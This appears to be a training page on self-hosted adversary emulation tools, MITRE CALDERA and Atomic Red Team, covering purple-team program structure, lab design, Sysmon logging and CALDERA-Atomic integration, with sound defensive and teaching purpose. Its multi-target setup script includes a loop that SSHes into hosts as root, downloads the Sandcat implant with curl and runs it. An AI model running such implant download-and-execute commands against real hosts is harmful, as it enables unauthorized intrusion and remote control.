---
layout: training-page
title: "Self-Hosted Adversary Emulation Tools — Red Team Academy"
module: "Red Team Tools"
tags:
  - self-hosted
  - adversary-emulation
  - purple-team
  - caldera
  - atomic-red-team
  - detection-validation
  - lab-setup
page_key: "tools-self-hosted-tools"
render_with_liquid: false
---

# Self-Hosted Adversary Emulation Tools

Self-hosted adversary emulation tools let you run structured ATT&CK-mapped attack sequences in a controlled environment — generating real telemetry against real hosts, without sending data to third-party infrastructure. The primary tools in this space are MITRE CALDERA and Atomic Red Team.

This page covers: when to use each tool, how they fit into a purple-team program, lab architecture, and the integration between the two.

## Tool Comparison

| | MITRE CALDERA | Atomic Red Team | Real C2 (CS/Havoc/Mythic) |
|---|---|---|---|
| **Scope** | Multi-step chained operations, autonomous or manual | Single-technique tests, one command at a time | Full adversary simulation with human operator |
| **Agent** | Beaconing implant (Sandcat/Manx) | No persistent agent — tests run inline | Full-featured C2 implant |
| **Orchestration** | Server-driven, planner-automated | PowerShell module or Python CLI | Operator-driven teamserver |
| **ATT&CK mapping** | First-class — every ability is mapped | First-class — every atomic is mapped | Manual; operator-defined |
| **Reporting** | Automated (Debrief plugin: PDF/JSON, ATT&CK heat map) | CSV/ATTiRe log, VECTR integration | Manual (engagement report) |
| **Detection signal** | Intentionally detectable — designed for purple team | Minimal footprint by design | Operator-controlled; evasion is the point |
| **Best for** | Adversary emulation exercises, multi-stage kill chains | Per-technique detection validation, SIEM tuning | Real red-team engagements |
| **Learning curve** | Medium — plugin ecosystem, YAML authoring | Low — single PowerShell module | High — full C2 tradecraft |

## When to Use Which Tool

**Use Atomic Red Team when:**
- You need to validate that a specific detection rule fires on a specific technique
- A SIEM engineer says "show me T1059.001 executing on a Windows host"
- You're building out detection coverage and want to test one technique at a time
- You want minimal setup — no server, no implant, just a PowerShell module

**Use CALDERA when:**
- You're running a full adversary emulation exercise simulating a known threat actor (APT29, FIN6)
- You need multi-stage operations: initial execution → persistence → credential access → lateral movement → exfil
- You want autonomous execution while you focus on other work
- You need structured reporting for a stakeholder briefing (ATT&CK heat maps, campaign timelines)
- You're building a repeatable purple-team program that runs the same scenarios monthly

**Use both together when:**
- You want CALDERA to orchestrate Atomic Red Team tests as part of a larger operation
- The `atomic` plugin in CALDERA imports every Atomic Red Team test as a CALDERA ability — enabling you to chain individual detection tests into full emulation campaigns

**Use a real C2 (Cobalt Strike / Havoc / Mythic) when:**
- The objective is a genuine red-team engagement with evasion, lateral movement, and operational security
- You need C2 features: sleep timers, malleable profiles, encrypted comms, post-exploitation modules
- Detectability is not the goal — passing detection is

## Purple-Team Program Structure

A mature purple-team program typically combines all three in sequence:

<pre><code>Phase 1 — Technique Coverage (Atomic Red Team)
  For each technique on your detection backlog:
    run atomic → confirm alert fires → log pass/fail → cleanup
  Output: technique-by-technique coverage map

Phase 2 — Kill Chain Emulation (CALDERA)
  For each threat actor relevant to your environment:
    build adversary profile → deploy Sandcat → run operation
    → review Debrief report → identify detection gaps
  Output: kill-chain coverage report, ATT&CK Navigator layer

Phase 3 — Adversarial Validation (Red C2)
  Bring in red team with full C2 + evasion
  Blue team defends with current detection stack
  Output: realistic gap assessment against a live threat
</code></pre>

## Lab Architecture

### Minimum Viable Lab

<pre><code>┌─────────────────────────────────────────────────────────┐
│  Attacker Machine (Linux recommended)                    │
│  - CALDERA server (port 8888)                            │
│  - Atomic Red Team test runner (PowerShell Core)         │
│  - Network access to target subnet                       │
└──────────────────────┬──────────────────────────────────┘
                       │ Agent callback / WinRM
┌──────────────────────▼──────────────────────────────────┐
│  Target Machine (Windows, lab domain preferred)          │
│  - Sysmon + Windows Event Forwarding                     │
│  - Sandcat agent (for CALDERA)                           │
│  - PowerShell 5.1+ (for Invoke-AtomicRedTeam)            │
└──────────────────────┬──────────────────────────────────┘
                       │ Log forwarding
┌──────────────────────▼──────────────────────────────────┐
│  SIEM / EDR                                              │
│  - Receives Windows event logs                           │
│  - Validates that detections fire                        │
└─────────────────────────────────────────────────────────┘
</code></pre>

### Recommended Sysmon Config

Run Sysmon on all target machines with a comprehensive configuration. The SwiftOnSecurity or Olaf Hartong modular configs are the standard starting point:

<pre><code>sysmon64.exe -accepteula -i sysmonconfig.xml

# Key event IDs for adversary emulation coverage:
# EID 1  — Process creation (catches most execution techniques)
# EID 3  — Network connection (C2, lateral movement)
# EID 7  — Image load (DLL injection, reflective loading)
# EID 8  — CreateRemoteThread (process injection)
# EID 10 — ProcessAccess (LSASS dumping, credential access)
# EID 11 — FileCreate (payload drops)
# EID 12/13 — Registry create/set (persistence)
# EID 22 — DNS query (C2 over DNS, discovery)
# EID 25 — ProcessTampering (hollowing, herpaderping)
</code></pre>

### Isolation Requirements

- **Keep CALDERA server off the target network if possible.** Sandcat callbacks cross a network boundary, which produces realistic traffic patterns and avoids localhost-only test artifacts.
- **Never expose CALDERA to the internet.** Run on a dedicated VPN segment or management network.
- **Snapshot target VMs** before each session — atomics leave artifacts and cleanup is best-effort. Revert to a clean snapshot between test runs.
- **Domain-joined targets** produce richer telemetry (Kerberos events, AD replication logs) than standalone workstations.

### Multi-Target Setup

<pre><code># CALDERA: deploy Sandcat to multiple hosts simultaneously
# Linux targets:
server="http://192.168.10.5:8888"
for host in 192.168.10.{20..25}; do
  ssh root@${host} "curl -s -X POST \
    -H 'file:sandcat.go' -H 'platform:linux' -H 'server:${server}' \
    ${server}/file/download > /tmp/scat && chmod +x /tmp/scat && /tmp/scat -server ${server} -group lab &"
done

# Atomic Red Team: remote execution via PSSession array
$cred = Get-Credential
$targets = @("win-01", "win-02", "win-03")
$sessions = $targets | ForEach-Object {
  New-PSSession -ComputerName $_ -Credential $cred
}

# Run the same test on all targets:
$sessions | ForEach-Object {
  Invoke-AtomicTest T1059.001 -Session $_ -GetPrereqs
  Invoke-AtomicTest T1059.001 -Session $_ -TestNumbers 1
}

# Cleanup all:
$sessions | ForEach-Object {
  Invoke-AtomicTest T1059.001 -Session $_ -Cleanup
}
$sessions | Remove-PSSession
</code></pre>

## CALDERA + Atomic Integration Workflow

<pre><code># 1. Enable the atomic plugin in CALDERA conf/local.yml:
plugins:
  - atomic
  - sandcat
  - debrief
  - compass

# 2. Start CALDERA. On first load, it clones and imports the atomics catalog.

# 3. Deploy Sandcat to target hosts (see caldera.md — Deploying Agents).

# 4. Build an adversary profile using atomic ability IDs:
#    In the UI: Campaigns → Adversaries → New
#    Add atomic abilities by ATT&CK technique or search by name

# 5. Create a fact source with target host details:
#    Campaigns → Sources → New
#    Add facts: host.user.name, remote.host.ip, domain.fqdn

# 6. Run the operation:
#    Operations → New Operation
#    Adversary: your atomic-based profile
#    Planner: atomic (sequential, predictable for detection testing)
#    Fact Source: your lab source
#    Start

# 7. When done: Plugins → Debrief → select operation → Export PDF
#    The report maps every executed ability to ATT&CK and shows which
#    techniques produced detections.
</code></pre>

## Security Considerations

**CALDERA is not hardened for production.** The web UI and API were not designed to resist external attack. Mitigations:

- Run on an isolated management VLAN
- Block port 8888 at the perimeter firewall
- Change all default credentials immediately (`admin/admin` is public knowledge)
- Use the SSL plugin and a TLS proxy for any multi-user lab where the server is on a shared network
- Rotate API keys between engagements

**Atomic Red Team runs real attack commands.** It is not a simulation:

- Tests execute on the machine running the PowerShell session — or on the remote PSSession target
- Elevation-required tests can modify system state beyond cleanup's reach
- Run against dedicated lab machines only; never against production endpoints without explicit written authorization
- Snapshot VMs before every test session; revert after

**Detection signal from these tools is high-fidelity but recognizable:**

- Sandcat's HTTP beacon pattern is well-documented and easy to detect — that's intentional for purple-team work
- Invoke-AtomicRedTeam imports have a known process tree signature (PowerShell spawning via Invoke-AtomicTest)
- Both tools are appropriate for purple-team and training; neither is suitable for real red-team engagements where detection evasion matters

## Resources

- CALDERA platform guide — `tools/caldera/`
- Atomic Red Team guide — `tools/atomic-red-team/`
- MITRE CALDERA — `github.com/mitre/caldera`
- Atomic Red Team — `github.com/redcanaryco/atomic-red-team`
- ATT&CK Navigator — `mitre-attack.github.io/attack-navigator/`
- Sysmon config (SwiftOnSecurity) — `github.com/SwiftOnSecurity/sysmon-config`
- Sysmon config (Olaf Hartong modular) — `github.com/olafhartong/sysmon-modular`
- VECTR test tracking — `github.com/SecurityRiskAdvisors/VECTR`
- CTID Adversary Emulation Plans — `github.com/center-for-threat-informed-defense/adversary_emulation_library`
